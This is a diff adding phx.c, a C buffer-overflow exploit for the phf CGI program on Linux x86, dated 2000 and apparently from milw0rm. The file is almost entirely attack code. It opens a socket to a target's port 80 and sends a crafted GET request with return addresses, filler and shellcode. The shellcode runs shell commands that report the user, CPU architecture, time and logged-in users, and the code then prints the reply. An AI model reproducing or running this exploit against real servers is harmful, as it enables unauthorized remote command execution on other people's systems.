@@ -1,0 +1,170 @@
+/*
+ |  phx.c -- phf buffer overflow exploit for Linux-ix86
+ |  Copyright (c) 2000 by proton. All rights reserved.
+ |
+ |  This program is free software; you can redistribute it and/or modify
+ |  it under the terms of the GNU General Public License as published by
+ |  the Free Software Foundation; either version 2 of the License, or
+ |  (at your option) any later version.
+ |
+ |  This program is distributed in the hope that it will be useful,
+ |  but WITHOUT ANY WARRANTY; without even the implied warranty of
+ |  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ |  GNU General Public License for more details.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <errno.h>
+
+char    tmp[8192];
+char    *host;
+char    *progname;
+
+#define output(x) write(1,x,sizeof(x))
+
+unsigned char shellcode[] =
+  "GET /cgi-bin/phf?&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&"
+  /*
+   *  2 pointers, in case of -fomit-frame-pointer
+   */
+  "\x37\xfc\xff\xbf"
+  "\x37\xfc\xff\xbf"
+  " HTTP/1.0\n"
+  /*
+   *  set environment var `HTTP_X'
+   */
+  "X: "
+  /*
+   *  a bundle of AAA's, they're just as good as NOP's
+   *  but is a tad bit more readable to humans.
+   *  512 no-op instructions gives us a nice phat
+   *  strike-zone for the above 2 pointers.
+   */
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  "7777777777777777777777777777777777777777777777777777777777777777"
+  /*
+   *  exploit code
+   */
+  "\xeb\x3b\x5e\x8d\x5e\x10\x89\x1e\x8d\x7e\x18\x89\x7e\x04\x8d\x7e\x1b\x89\x7e\x08"
+  "\xb8\x40\x40\x40\x40\x47\x8a\x07\x28\xe0\x75\xf9\x31\xc0\x88\x07\x89\x46\x0c\x88"
+  "\x46\x17\x88\x46\x1a\x89\xf1\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xc0\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+  "\x41\x41"
+  /*
+   *  try to make sense to the webserver
+   */
+  "/bin/sh -c echo 'Content-Type: text/plain';echo '';"
+  /*
+   *  execute something funny!
+   */
+  "echo Hello! I am running as \\\"`whoami`\\\" on a `arch` cpu;"
+  "echo Local time is `date` and there are `who|wc -l` users logged in.;"
+  "echo '';"
+  /*
+   *  shellcode will terminate command at the `@'
+   */
+  "@\n\n"
+  ;
+
+void netpipe(int *rsock, int *wsock)
+{
+  struct  sockaddr_in sai;
+  struct  hostent *he;
+  int     s;
+
+  if (!host || !*host)
+  {
+    printf("Usage: %s <host>\n",progname);
+    exit(1);
+  }
+  he = gethostbyname(host);
+  if (!he)
+  {
+    printf("%s: Unknown host\n",host);
+    exit(1);
+  }
+
+  s = socket(AF_INET,SOCK_STREAM,0);
+  sai.sin_family = AF_INET;
+  sai.sin_port = htons(80);
+  memcpy(&sai.sin_addr,he->h_addr_list[0],sizeof(struct in_addr));
+
+  if (connect(s,(struct sockaddr*)&sai,sizeof(sai)) < 0)
+  {
+    switch(errno)
+    {
+    case ECONNREFUSED:
+      output("Connection refused.\n");
+      break;
+    case ETIMEDOUT:
+      output("Connection timed out.\n");
+      break;
+    case ENETUNREACH:
+      output("Network unreachable.\n");
+      break;
+    default:
+      output("Unknown error.\n");
+      break;
+    }
+    exit(1);
+  }
+  *rsock = *wsock = s;
+}
+
+int main(int argc, char **argv)
+{
+  char    *q,*cp;
+  int     in,out;
+  int     sz,x,n;
+
+  progname = argv[0];
+  host = argv[1];
+
+  netpipe(&in,&out);
+  write(out,shellcode,sizeof(shellcode));
+  output("\nCome to papa!\n\n");
+
+  n = x = 0;
+  for(;;)
+  {
+    sz = read(in,&tmp[x],512-x);
+    if (sz < 1)
+      break;
+    x += sz;
+    q = cp = tmp;
+    for(sz=x;sz;)
+    {
+      if (*q == '\n')
+      {
+        write(1,cp,(q-cp)+1);
+        cp = q + 1;
+      }
+      q++;
+      sz--;
+    }
+    if (cp != tmp)
+    {
+      sz = x - (cp - tmp);
+      memcpy(tmp,cp,sz);
+      x -= (cp - tmp);
+    }
+  }
+  exit(0);
+}
+
+
+// milw0rm.com [2000-12-01]
